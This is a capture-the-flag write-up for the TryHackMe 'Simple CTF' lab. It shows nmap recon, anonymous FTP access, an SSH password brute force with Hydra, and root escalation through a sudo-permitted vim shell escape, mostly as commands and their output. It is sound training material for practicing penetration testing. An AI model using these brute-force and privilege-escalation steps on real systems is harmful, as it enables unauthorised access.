<p align="center"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png" width="800" ></p>
<h1><p align="center">Simple CTF </p></h1>

### Room Link: [THM-EasyCTF](https://tryhackme.com/room/easyctf) 

## Recon
So I began with nmap scan to Find entry points.
```bash 
$ sudo nmap -T4 -sC -sS 10.10.210.59 > nmap.out
$ cat nmap.out
...
Host is up (0.15s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.155.126
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  EtherNetIP-1
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)

Nmap done: 1 IP address (1 host up) scanned in 40.91 seconds
```

As I can see there is a ftp server running on target vulnerable to Anonymous login. Lets checkout. Found a txt file download and cat out.
```bash
$ ftp 10.10.210.59
Connected to 10.10.210.59.
220 (vsFTPd 3.0.3)
Name (10.10.210.59:FaLLenGuY): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
cd200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls 
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (98.3077 kB/s)
ftp>exit

$ cat ForMitch.txt              
Dammit man... you'te the worst dev i've seen. 
You set the same pass for the system user, and the password is so weak... i cracked it in seconds. 
Gosh... what a mess!
```

Gives us an idea that it has weak password for something may be SSH login and potential name mitch.
so I bruteforced it ssh login with Hydra.
```bash
$ sudo hydra -L name  -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt  10.10.210.59 ssh -s 2222 -o hydra.out    1 ⚙

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-20 10:28:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 330 login tries (l:3/p:110), ~21 tries per task
[DATA] attacking ssh://10.10.210.59:2222/
[STATUS] 167.00 tries/min, 167 tries in 00:01h, 182 to do in 00:02h, 16 active
[2222][ssh] host: 10.10.210.59   login: mitch   password: ******** 
[STATUS] 157.50 tries/min, 315 tries in 00:02h, 38 to do in 00:01h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-20 10:31:41

```
Lets ssh in with creds found. And stablize shell with this python one-liner ```python3 -c 'import pty;pty.spawn("/bin/bash")'```
```bash
$ ssh mitch@10.10.210.59 -p 2222                                                                                          130 ⨯ 1 ⚙
The authenticity of host '[10.10.210.59]:2222 ([10.10.210.59]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.210.59]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.210.59's password:          

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
mitch@Machine:~$ ls
user.txt

mitch@Machine:~$ cat user.txt 
***************

```
## Privilege Escalation
Now Its time to Escalate Privileges.
```bash

mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:                                                                                 
    (root) NOPASSWD: /usr/bin/vim          
```
So it seems user mitch has vim pawnage with sudo, lets exploit it. 
Check out [GTFOBins](https://gtfobins.github.io/#vim)

```bash
mitch@Machine:~$ sudo /usr/bin/vim -c ':!/bin/sh'

#[[2;2R^H^H^
# python3 -c 'import pty;pty.spawn("/bin/bash")'

root@Machine:~# whoami
root

root@Machine:~# find / -name root.txt -type f 2>/dev/null 
/root/root.txt
root@Machine:/root# cat /root/root.txt
***************

```
With That We have Root Flag.


















